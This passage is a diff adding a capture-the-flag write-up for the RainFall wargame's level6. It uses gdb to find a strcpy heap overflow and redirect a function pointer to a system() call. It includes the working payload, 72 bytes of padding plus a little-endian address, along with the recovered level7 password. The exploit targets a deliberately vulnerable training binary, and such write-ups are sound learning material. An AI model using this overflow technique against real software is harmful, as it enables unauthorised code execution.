@@ -1,0 +1,141 @@
+# We have a executable "level6" lets do some test!
+
+>level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+>level6@RainFall:~$ ./level6 test
+Nope
+>level6@RainFall:~$ ./level6 test test
+Nope
+>level6@RainFall:~$
+
+# The program crash without argument but display Nope with argument, next step use gdb!
+
+>level6@RainFall:~$ gdb level6
+(gdb) disas main
+[...]
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+   0x08048495 <+25>:	movl   $0x4,(%esp)
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+[...]
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    0x18(%esp),%eax
+   0x080484ce <+82>:	mov    (%eax),%eax
+   0x080484d0 <+84>:	call   *%eax
+
+# Two calls to malloc and one for a strcpy but after that it move the return of strcpy by 0x18 and call the address... Weird
+
+# Let's do some test
+
+(gdb) r $(python -c "print('A' * 200)")
+Starting program: /home/user/level6/level6 $(python -c "print('A' * 200)")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+# It crash but where? let's add some breakpoint
+
+(gdb) b *0x080484c5
+Breakpoint 1 at 0x80484c5
+(gdb) b *0x080484ca
+Breakpoint 2 at 0x80484ca
+(gdb) b *0x080484d0
+Breakpoint 3 at 0x80484d0
+
+# Let's run the program 
+
+(gdb) r $(python -c "print('A' * 200)")
+Starting program: /home/user/level6/level6 $(python -c "print('A' * 200)")
+
+Breakpoint 1, 0x080484c5 in main ()
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080484ca in main ()
+(gdb) continue
+Continuing.
+
+Breakpoint 3, 0x080484d0 in main ()
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+# So its the call to $eax who fail but we can influence the address eax will call
+
+# So we need to determine the padding
+
+# We can see eax is moved to esp + 0x18
+
+(gdb) x/wx $esp +  0x18
+0xbffff568:	0x0804a050
+(gdb) x $eax
+0x804a008:	0x41414141
+
+# Before the move instruction eax point to 0x804a008 but after the instruction it will point to 0x0804a050
+
+# So the padding is 0x0804a050 - 0x804a008 (134520912 - 134520840 = 72)
+
+# But there no system call in the main maybe there are other function?
+
+(gdb) info function
+[...]
+0x08048430  frame_dummy
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+[...]
+
+# Let's disasamble both n and m
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048454 <+0>:	push   %ebp
+   0x08048455 <+1>:	mov    %esp,%ebp
+   0x08048457 <+3>:	sub    $0x18,%esp
+   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
+   0x08048461 <+13>:	call   0x8048370 <system@plt>
+   0x08048466 <+18>:	leave  
+   0x08048467 <+19>:	ret    
+End of assembler dump.
+(gdb) disas m
+Dump of assembler code for function m:
+   0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	sub    $0x18,%esp
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+   0x0804847a <+18>:	leave  
+   0x0804847b <+19>:	ret    
+End of assembler dump.
+
+# So m function was the function called to puts the Nope. And the n function have a system call!
+
+# So let's make that the eax point to the n function
+
+(gdb) r $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
+Starting program: /home/user/level6/level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
+
+Breakpoint 1, 0x080484c5 in main ()
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x080484ca in main ()
+(gdb) continue
+Continuing.
+
+Breakpoint 3, 0x080484d0 in main ()
+(gdb) continue
+Continuing.
+/bin/cat: /home/user/level7/.pass: Permission denied
+[Inferior 1 (process 2965) exited normally]
+
+# Nice! Let's do it outside gdb
+
+level6@RainFall:~$ ./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+
+
+
